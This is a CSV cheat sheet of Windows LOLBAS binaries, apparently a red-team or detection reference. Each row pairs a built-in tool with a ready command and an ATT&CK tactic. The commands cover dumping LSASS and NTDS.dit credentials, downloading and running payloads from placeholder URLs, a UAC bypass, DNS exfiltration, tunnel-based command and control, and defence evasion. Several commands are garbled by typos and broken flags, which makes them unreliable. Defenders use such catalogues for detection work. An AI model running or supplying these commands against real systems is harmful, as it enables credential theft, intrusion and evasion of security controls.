Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
unregmp2.exe,LOLBAS,,"rmdir %tmp%\lolbin /s /q 2>null & mkdir “%tmp\lolbin\Windows Media Player” & copy C:\Windows\System32\calc.exe %tmp%\lolbin\Windows Media Player\wmpnscfg.exe” >nul && cmd /V /C “set “ProgramW6432=%tmp%\lolbin” && unregmp.exe /HideWMP” - allows an attacker to copy a target binary to be a controlled direcotry and modify programw6432 environment viarable to point that controlled directory, then execute unregmp2.exe with argument /HideWMP which will spawn a process at the hijacked path %ProgramW6432%/wmpnscfg.exe ","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
vbc.exe,LOLBAS,,vbc.exe /traget:exe c:\tmp\vbs\run.vb - binary file used by .NET to compile visual basic code to an executable,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
verclsid.exe,LOLBAS,,verclsid.exe /S /C {CLSID} - Used to verify a COM object before it is instantiated by Windows Explorer,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wab.exe,LOLBAS,,wab.exe - Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
winget.exe,LOLBAS,,winget.exe install - -manifest manifest.yml - downloads a file from the web address specified in manifest.yml and executes it on the system,"LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
Wlrmdr.exe,LOLBAS,,wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u calc.exe - Execute calc.exe with wlrmdr.exe as a parent process,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wmic.exe,LOLBAS,,wmic.exe process call create calc - execute calc from wmic,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
workfolders.exe,LOLBAS,,WorkFolders - Execute control.exe in the current working directory,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wscript.exe,LOLBAS,,wscript //e:vbscript c:\ads\file.txt:script.vbs - Execute script stored in an alternate data stream,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wsreset.exe,LOLBAS,,"wsreset.exe - During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.","LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Privilege Escalation"
wuauclt.exe,LOLBAS,,wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComserver - executes code on attach,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
xwizard.exe,LOLBAS,,xwizard RunWizard {0000001-0000-0000-0000-0000FEEDACDC} - xwizard.exe running a custom class that has been added to the registry.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
msedge_proxy.exe,LOLBAS,,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://[putsomesitehere][.]com - download malicious file,"LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
msedgewebview2.exe ,LOLBAS,,msedgewebview2.exe - -no-sandbox - -browser-subprocess-path=”C:\Windows\System32\calc.exe” - spawns edge web view 2 browser without sandboxing and spawns calc.exe as sub process.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wt.exe,LOLBAS,,wt.exe calc.exe - execute calc.exe via windows terminal,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
code.exe,LOLBAS,,code.exe tunnel - -acept-server-license-terms - -name “tunnel-name” - Starts a reverse powershell connection over  global.rel.tunnels.api.visualstudio.com via websockets; command,"LOLBAS, LOTL (Living Off The Land)",Command And Control
GfxDownloadWrapper.exe,LOLBAS,,"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE” - downloads the content that returns URL and writes it to the file DESTINATION FILE PATH.","LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
Advpack.dll,LOLBAS,,"rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1, - execute the specified wsh / .sct script with scrobj.dll in teh .inf file by calling an information file directive.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
desk.cpl,LOLBAS,,"rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr - Launch an executable with a .scr extension by calling the InstallScreenSaver function","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
dfshim.dll,LOLBAS,,"rundll32.exe dfshim.dll,ShOpenverbApplication http://[somewebsitehere][.]com - executes click-once application from URL.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Ieadvpack.dll,LOLBAS,,"rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.info,DefaultInstall_SingleUser,1, - Execute the specified wsh / sct script with scrobdj.dll the inf file by calling an information file directive","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ieframe.dll,LOLBAS,,"rundll32.exe ieframe.dll,OpenURL “C:\test\calc.url”  - Launch an executable payload via proxy through a URL by calling OpenURL","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Mshtml.dll,LOLBAS,,"rundll32.exe mshtml.dll,PrintHTML “C:\temp\calc.hta” - Invoke an HTML application via mshta.exe ","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Pcwutl.dll,LOLBAS,,"rundll32.exe pcwutl.dll,LaunchApplication calc.exe - Launch executable by calling the LaunchApplication function","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Scrobj.dll,LOLBAS,,"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://[insertdomain][.]com/payload.exe - once executed rundll32.exe will download the file at the URL to %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\<random>\payload[1].exe.","LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
Setupapi.dll,LOLBAS,,"ruyndll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\Shady.inf - Execute the specified wsh / sct script with scrobj.dll in the .inf file by calling an information file directive.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Url.dll,LOLBAS,,"rundll32.exe url.dll,OpenUrl “C:\test\calc.hta” - Launch a HTML application payload by calling OpenURL","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Zipfldr.dll,LOLBAS,,"rundll32.exe zipfldr.dll,RouteTheCall calc.exe - Launch an executable payload by calling RouteTheCall","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Comsvcs.dll,LOLBAS,,"rundll32.exe c:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full - Calls the MiniDump exported function of comsvcs.dll, which in turn calls MiniDumpWriteDump","LOLBAS, LOTL (Living Off The Land)",Credential Access
AccCheckConsole.exe,LOLBAS,,AccCheckConsole.exe -window “Untitled - Notepad” C:\path\to\your\lolbas.dll - Load a managed DLL in the context of AccCheckConsole.exe the -window switch value can be set to an arbitrary active window name ,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
adplus.exe,LOLBAS,,adplus.exe -hang -pn lsass.exe -o c:\wherever - Creates a memory dump of the lsass process,"LOLBAS, LOTL (Living Off The Land)",Credential Access
AgentExecutor.exe,LOLBAS,,"AgentExecutor.exe -powershell ""c:\temp\malicious.ps1"" ""c:\temp\test.log"" ""c:\temp\test1.log"" ""c:\temp\test2.log"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1 - Spawns Powershell.exe and executes a provided powershell script with ExecutionPolicy bypass argument","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Appvlp.exe,LOLBAS,,AppVLP.exe \\webdav\calc.bat - executes calc.bat through AppVLP.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
bginfo.exe,LOLBAS,,bginfo.exe bginfo.bgi /popup /nolicprompt - execute VBscript code that is referenced within the bginfo.bgi file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
cdb.exe,LOLBAS,,cdb.exe -cf x64_calc.wds -o notepad.exe - Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
coregen.exe,LOLBAS,,coregen.exe /L C:\folder\evil.dll dummy_assembly_name - Loads the target .DLL in arbitrary path specified with /L,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
CreateDump.exe,LOLBAS,,createdump.exe -n -f dump.dmp [PID] - dump process by PID and create a minidump file,"LOLBAS, LOTL (Living Off The Land)",Credential Access
csi.exe,LOLBAS,,csi.exe [file] - use csi.exe to run unsigned C# code,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Defaultpack.exe,LOLBAS,,"defaultpack.exe /C:”process.exe args” - use DefaultPack EXE to execute arbitrary binaries, with added arguement support.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Devinit.exe,LOLBAS,,devinit.exe run -t msi-install -i https://[somewebsitehere][.]com - Downloads an MSI file to C:\Windows\Installer and then installs it,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Devtoolslauncher.exe,LOLBAS,,devtoolslauncher.exe LaunchForDeploy [Path_to_bin] “argument here” test - The above binary will execute the other binary,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
dnx.exe,LOLBAS,,dnx.exe consoleapp - Execute C# code located in the consoleapp folder via ‘program.cs’ and ‘project.json’,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
dotnet.exe,LOLBAS,,dotnet.exe [PATH-TO-DLL] - dotnet.exe will execute any dll even if applocker is enabled,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
dsdbutil.exe,LOLBAS,,dsdbutil.exe “activate instance ntds” “snapshot” “create” “quit” “quit” - dsdbutil supports VSS snapshot creation,"LOLBAS, LOTL (Living Off The Land)",Credential Access
dump64.exe,LOLBAS,,dump64.exe <pid> out.dmp - creates a memory dump of the LSASS process,"LOLBAS, LOTL (Living Off The Land)",Credential Access
dumpminitool.exe,LOLBAS,,dumpminitool.exe - -file c:\location - -processID 1132 - -dumpType Full,"LOLBAS, LOTL (Living Off The Land)",Credential Access
dxcap.exe,LOLBAS,,dxcap.exe -c C:\Windows\System32\notepad.exe - Launch notepad.exe as a subprocess of dxcap.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
excel.exe,LOLBAS,,excel.exe http://[domainhere][.]com - Downloads payload from remote server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Fsi.exe,LOLBAS,,fsi.exe c:\path\to\test.fsscript - Execute F# code via script file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
fsianycpu.exe,LOLBAS,,fsianycpu.exe c:\path\to\test.fsscript,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
mftrace.exe,LOLBAS,,mftrace.exe cmd.exe - launch cmd as a subprocess of mftrace.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
microsoft.nodejstools.pressanykey.exe,LOLBAS,,Microsoft.NodejsTools.PressAnyKey.exe normal 1 cmd.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
msdeploy.exe,LOLBAS,,msdeploy.exe -verb:sync -source:RunCommand -dest:runComman=”c:\temp\calc.bat” - Launch calc.bat via msdeploy.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
MsoHtmEd.exe,LOLBAS,,MsoHtmEd.exe https://[insertwebsite][.]com - Downloads payload from Remote Server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Mspub.exe,LOLBAS,,mspub.exe https://[insertwebsite][.]com - Downloads payload from remote server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
msxsl.exe ,LOLBAS,,msxsl.exe customers.xml script.xsl - Run COM scriptlet code within the script .xsl file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ntdsutil.exe,LOLBAS,,ntdsutil.exe “ac i ntds” “ifm” “create full C:\” q q - Dump NTDS.dit into folder,"LOLBAS, LOTL (Living Off The Land)",Credential Access
OpenConsole.exe,LOLBAS,,OpenConsole.exe calc - execute calc with OpenConsole as parent process,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Powerpnt.exe,LOLBAS,,Powerpnt.exe “http://[insertwebsite][.]com” - Downloads payload from remote server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Procdump.exe,LOLBAS,,Procdump.exe -md calc.dll explorer.exe - creates dump,"LOLBAS, LOTL (Living Off The Land)",Credential Access
Protocolhandler.exe,LOLBAS,,protocolhandler.exe https://[insertwebsite][.]com - Downloads payload from remote server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
rcsi.exe,LOLBAS,,rcsi.exe bypass.csx - use embedded C# within the csx script to execute the code,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
remote.exe,LOLBAS,,remote.exe /s “powershell.exe” anythinghere - spawns powershell as a child process of remote.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Sqldumper.exe,LOLBAS,,sqldumper.exe 464 0 0x0110 - Dump process by PID and create a dump file,"LOLBAS, LOTL (Living Off The Land)",Credential Access
Sqlps.exe,LOLBAS,,Sqlps.exe -noprofile - Run a SQL server PowerShell mini-console without module and scriptblock logging,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
SQLToolsPS.exe,LOLBAS,,SQLToolsPS.exe -noprofile -command Start-Process calc.exe - Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Squirrel.exe,LOLBAS,,squirrel.exe - -download [url] - Downloads file from url,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
te.exe,LOLBAS,,te.exe bypass.wsc - Run COM scriptlets by calling a windows script component WSC file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Teams.exe,LOLBAS,,"teams.exe - Generate JavaScript payload and package.json, and save to ""%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app\\"" before executing.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
TestWindowRemoteAgent.exe,LOLBAS,,TestWindowRemoteAgent.exe start -h {your-base64-data}.example[.]com -p 8000 - Sends dns query for open connection to any host enabling exfiltration over DNS,"LOLBAS, LOTL (Living Off The Land)",Exfiltration
Tracker.exe,LOLBAS,,Tracker.exe /d .\calc.dll /c C:\Windows\write.exe - use tracker.exe to proxy execution of an arbitrary dll into another process.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Update.exe,LOLBAS,,udate.exe - -download [URL] - The above binary will go to URL and look for RELEASES file and download the package.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
VSDiagnostics.exe,LOLBAS,,VSDiagnostics.exe start 1 /launch:calc.exe - Starts a collection session with Session ID1 and calls kernelbase createprocessw to launch specified executable.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
VSIISExeLauncher.exe,LOLBAS,,VSIISExeLauncher.exe -p [Path_to_bin) -a “argument here” - the above binary will execute other binary,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
VisualUiaVerifyNative.exe,LOLBAS,,VisualUiaVerifyNative.exe - Generate serialized gadget and save to C:\Users\CurrentUser\AppData\Roaminguiverify.config before executing.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
vshadow.exe,LOLBAS,,vshadow.exe -nw -exec=c:.\windows\system32\calc.exe C: - executes calc.exe from vshadow.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
vsjitdebugger.exe,LOLBAS,,vsjitdebugger.exe calc.exe - executes calc.exe as a subprocess of vsjitdebugger.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wfc.exe,LOLBAS,,wfc.exe C:\path\to\test.xoml - execute arbitrary C# code embedded in a XOML file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
winword.exe,LOLBAS,,winword.exe “http://[inserstiehere] - downloads payload from remote server,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
wsl.exe,LOLBAS,,wsl.exe -e /mnt/c/Windows/system32/calc.exe - executes calc from wsl.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
devtunnel.exe,LOLBAS,,devtunnel.exe host -p 8080 - enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet,"LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
vsls-agent.exe,LOLBAS,,vsls-agent.exe - -agentExtensionPath c:\path\to\payload.dll - load a library payload using the - -agentextensionpath paramter,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
vstest.console.exe,LOLBAS,,vstest.console.exe testcode.dll - VSTest functionality may allow an adversary to execute their malware by wrapping it as a test method then build it to a .exe or .dll file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
CL_LoadAssembly.ps1,LOLBAS,,powershell.exe -ep bypass -command “set-location -path c:\windows\diagnostic\system\audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\…\..\testing\fun.dll;[Program]::fun()” - Proxy execute managed DLL with PowerShell,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
CL_Mutexverifiers.ps1,LOLBAS,,. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess calc.ps1 - import the powershell diagnostic ml_mutexverifiers script and call runAfterCancelProcess to launch an executable,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
CL_Invocation.ps1,LOLBAS,,. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke <executable> [args] - Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
